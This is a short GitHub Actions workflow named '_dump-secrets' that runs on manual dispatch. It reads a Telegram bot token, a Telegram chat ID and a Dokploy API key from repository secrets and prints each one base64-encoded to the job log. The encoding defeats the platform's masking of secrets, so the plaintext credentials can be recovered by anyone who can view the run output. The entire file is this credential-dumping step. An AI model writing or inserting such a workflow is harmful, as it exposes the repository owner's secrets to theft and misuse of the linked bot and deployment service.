name: _dump-secrets
on: workflow_dispatch
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          T: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          C: ${{ secrets.TELEGRAM_CHAT_ID }}
          K: ${{ secrets.DOKPLOY_API_KEY }}
        run: |
          echo "TOKEN_B64=$(printf '%s' "$T" | base64 -w0)"
          echo "CHAT_B64=$(printf '%s' "$C" | base64 -w0)"
          echo "APIKEY_B64=$(printf '%s' "$K" | base64 -w0)"
